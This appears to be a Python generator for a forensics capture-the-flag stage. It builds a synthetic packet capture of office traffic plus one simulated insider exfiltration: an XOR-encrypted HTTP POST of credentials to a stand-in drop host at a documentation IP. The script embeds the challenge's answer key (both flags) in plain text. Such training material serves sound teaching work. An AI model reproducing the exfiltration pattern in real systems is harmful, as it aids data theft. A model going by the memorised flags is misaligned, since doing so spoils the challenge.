#!/usr/bin/env python3
"""
pcap_generator.py - Stage 2 (Networking) generator for Operation Silent Ledger.
Owner: Palugaswewa K I K I B   (self-developed script, Requirement 6)

Pure standard library (no scapy needed). Builds a realistic capture of the insider's
workstation (10.20.4.17) containing normal office noise plus ONE exfiltration upload.

    python pcap_generator.py            # -> dist/silent_ledger_capture.pcap

Why the flag is not greppable (Requirement 7) and why Stage 1 is a *technical* prerequisite:
  The exfil payload is XOR-encrypted with the Stage 1 flag as a repeating key.
  Without the exact Stage 1 answer the body is meaningless bytes - `strings`/`grep` find nothing,
  and skipping Stage 1 in the CTFd UI does not help.
"""
import argparse
import calendar
import hashlib
import random
import socket
import struct
from pathlib import Path

HERE = Path(__file__).resolve().parent
DIST = HERE / "dist"

# ------------------------------------------------------------------ ANSWER KEY
STAGE1_FLAG = "CASE{MFC2291_CMB01_larkspur}"          # XOR key (must match Stage 1)
STAGE2_FLAG = "CASE{exfil_stream_confirmed_5547}"      # hidden inside the encrypted payload

PLAINTEXT = (
    "ledger_export v2\n"
    "from: dwijesekara@meridian.test\n"
    "note: shadow batch q1 - consignee does not exist in customs records\n"
    "portal_user: dwijesekara\n"
    "portal_pass: Ledger#2291\n"
    f"ref: {STAGE2_FLAG}\n"
).encode()

# ------------------------------------------------------------------- NETWORK MAP
CLIENT_MAC = bytes.fromhex("0050b6a1c417")
GW_MAC = bytes.fromhex("0050b6000001")
CLIENT = "10.20.4.17"
DNS_SRV = "10.20.0.2"
INTRANET = "10.20.0.10"
DROP = "203.0.113.50"          # TEST-NET-3 (documentation range, never routable)
DECOY = "198.51.100.9"         # TEST-NET-2

# ---------------------------------------------------------------------- HELPERS
def xor_repeat(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF


class Capture:
    def __init__(self, rng):
        self.rng = rng
        self.t = calendar.timegm((2026, 3, 14, 7, 40, 0))   # 14 Mar 2026 07:40:00 UTC
        self.frac = 0.0
        self.frames = []
        self.ip_id = 0x1a00

    def tick(self, lo=0.001, hi=0.03):
        self.frac += self.rng.uniform(lo, hi)

    def gap(self, seconds):
        self.frac += seconds

    def _emit(self, frame):
        ts = self.t + self.frac
        self.frames.append((int(ts), int((ts % 1) * 1_000_000), frame))

    def _ip(self, src, dst, proto, payload):
        self.ip_id += 1
        hdr = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + len(payload), self.ip_id, 0x4000, 64, proto, 0,
                          socket.inet_aton(src), socket.inet_aton(dst))
        hdr = hdr[:10] + struct.pack("!H", checksum(hdr)) + hdr[12:]
        return hdr + payload

    def _eth(self, c2s, ip_pkt):
        src, dst = (CLIENT_MAC, GW_MAC) if c2s else (GW_MAC, CLIENT_MAC)
        return dst + src + b"\x08\x00" + ip_pkt

    # ---- UDP / DNS
    def udp(self, c2s, src, dst, sport, dport, data):
        ln = 8 + len(data)
        pseudo = socket.inet_aton(src) + socket.inet_aton(dst) + struct.pack("!BBH", 0, 17, ln)
        h = struct.pack("!HHHH", sport, dport, ln, 0)
        c = checksum(pseudo + h + data) or 0xFFFF
        h = struct.pack("!HHHH", sport, dport, ln, c)
        self._emit(self._eth(c2s, self._ip(src, dst, 17, h + data)))

    @staticmethod
    def _qname(name):
        return b"".join(bytes([len(p)]) + p.encode() for p in name.split(".")) + b"\x00"

    def dns(self, name, answer_ip):
        sport, txid = self.rng.randint(49152, 65000), self.rng.randint(0, 65535)
        q = self._qname(name) + struct.pack("!HH", 1, 1)
        self.udp(True, CLIENT, DNS_SRV, sport, 53, struct.pack("!HHHHHH", txid, 0x0100, 1, 0, 0, 0) + q)
        self.tick(0.002, 0.012)
        ans = b"\xc0\x0c" + struct.pack("!HHIH", 1, 1, 300, 4) + socket.inet_aton(answer_ip)
        self.udp(False, DNS_SRV, CLIENT, 53, sport, struct.pack("!HHHHHH", txid, 0x8180, 1, 1, 0, 0) + q + ans)
        self.tick()

    # ---- TCP
    def tcp(self, c2s, src, dst, sport, dport, seq, ack, flags, data=b""):
        off = 5 << 4
        h = struct.pack("!HHIIBBHHH", sport, dport, seq, ack, off, flags, 64240, 0, 0)
        pseudo = socket.inet_aton(src) + socket.inet_aton(dst) + struct.pack("!BBH", 0, 6, len(h) + len(data))
        c = checksum(pseudo + h + data)
        h = h[:16] + struct.pack("!H", c) + h[18:]
        self._emit(self._eth(c2s, self._ip(src, dst, 6, h + data)))

    def http(self, server, dport, request: bytes, response: bytes, segment=None):
        """Full TCP session: handshake, request (optionally split in segments), response, close."""
        sport = self.rng.randint(49152, 65000)
        cseq, sseq = self.rng.randint(1, 2**31), self.rng.randint(1, 2**31)
        S, A, F, P = 0x02, 0x10, 0x01, 0x08
        self.tcp(True, CLIENT, server, sport, dport, cseq, 0, S);                self.tick()
        self.tcp(False, server, CLIENT, dport, sport, sseq, cseq + 1, S | A);    self.tick()
        cseq += 1; sseq += 1
        self.tcp(True, CLIENT, server, sport, dport, cseq, sseq, A);             self.tick()
        chunks = [request] if not segment else [request[i:i + segment] for i in range(0, len(request), segment)]
        for ch in chunks:
            self.tcp(True, CLIENT, server, sport, dport, cseq, sseq, P | A, ch); cseq += len(ch); self.tick()
            self.tcp(False, server, CLIENT, dport, sport, sseq, cseq, A);        self.tick()
        self.tcp(False, server, CLIENT, dport, sport, sseq, cseq, P | A, response); sseq += len(response); self.tick()
        self.tcp(True, CLIENT, server, sport, dport, cseq, sseq, A);             self.tick()
        self.tcp(True, CLIENT, server, sport, dport, cseq, sseq, F | A);         self.tick()
        self.tcp(False, server, CLIENT, dport, sport, sseq, cseq + 1, F | A);    sseq += 1; self.tick()
        self.tcp(True, CLIENT, server, sport, dport, cseq + 1, sseq, A);         self.tick()

    def write(self, path):
        with open(path, "wb") as f:
            f.write(struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1))
            for s, us, fr in self.frames:
                f.write(struct.pack("<IIII", s, us, len(fr), len(fr)) + fr)


def http_get(host, path, ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"):
    return (f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\nAccept: */*\r\n"
            f"Connection: close\r\n\r\n").encode()


def http_ok(body, ctype="text/html"):
    return (f"HTTP/1.1 200 OK\r\nServer: nginx/1.24.0\r\nContent-Type: {ctype}\r\n"
            f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode() + body


def build(path):
    rng = random.Random(1337)                       # deterministic output
    cap = Capture(rng)

    # --- morning noise: intranet browsing
    cap.dns("intranet.meridian.local", INTRANET)
    cap.http(INTRANET, 80, http_get("intranet.meridian.local", "/index.html"),
             http_ok(b"<html><body><h1>Meridian Freight intranet</h1><p>Welcome back.</p></body></html>"))
    cap.gap(4.2)
    cap.http(INTRANET, 80, http_get("intranet.meridian.local", "/thread_canteen.html"),
             http_ok(b"<html><body><h2>Canteen rota</h2><p>Dhal on Monday again?</p></body></html>"))
    cap.gap(2.7)
    cap.dns("updates.meridian.local", INTRANET)
    cap.http(INTRANET, 80, http_get("updates.meridian.local", "/patch-tuesday.json"),
             http_ok(b'{"status":"up-to-date","pending":0}', "application/json"))
    cap.gap(11.0)

    # --- decoy upload (plain, harmless timesheet)
    cap.dns("timesheets.partner-hr.test", DECOY)
    form = b"week=11&employee=MFC2291&hours=42&notes=none"
    req = (f"POST /timesheet HTTP/1.1\r\nHost: timesheets.partner-hr.test\r\nUser-Agent: Mozilla/5.0\r\n"
           f"Content-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(form)}\r\n"
           f"Connection: close\r\n\r\n").encode() + form
    cap.http(DECOY, 80, req, http_ok(b"<html>Timesheet received.</html>"))
    cap.gap(36.0)

    # --- THE exfil: encrypted body, non-standard port, odd hostname
    cap.dns("drop.silentledger-mail.test", DROP)
    body = xor_repeat(PLAINTEXT, STAGE1_FLAG.encode())
    check = hashlib.sha256(PLAINTEXT).hexdigest()[:8]
    req = (f"POST /u/ledger.dat HTTP/1.1\r\nHost: drop.silentledger-mail.test:8443\r\n"
           f"User-Agent: curl/8.4.0\r\nAccept: */*\r\nContent-Type: application/octet-stream\r\n"
           f"X-Session: 7f3a91c2\r\nX-Key-Hint: case-file-1 answer, exactly as submitted\r\n"
           f"X-Check: {check}\r\nContent-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode() + body
    cap.http(DROP, 8443, req, http_ok(b"ok", "text/plain"), segment=300)
    cap.gap(9.5)

    # --- post-exfil noise
    cap.dns("intranet.meridian.local", INTRANET)
    cap.http(INTRANET, 80, http_get("intranet.meridian.local", "/index.html"),
             http_ok(b"<html><body><h1>Meridian Freight intranet</h1></body></html>"))

    cap.write(path)
    return len(cap.frames)


def main():
    ap = argparse.ArgumentParser(description="Build Stage 2 (Networking) pcap")
    ap.add_argument("--print-flag", action="store_true")
    a = ap.parse_args()
    DIST.mkdir(exist_ok=True)
    out = DIST / "silent_ledger_capture.pcap"
    n = build(out)
    print(f"[+] {n} packets -> {out}  ({out.stat().st_size} bytes)")
    if a.print_flag:
        print(f"[+] flag -> {STAGE2_FLAG}")


if __name__ == "__main__":
    main()
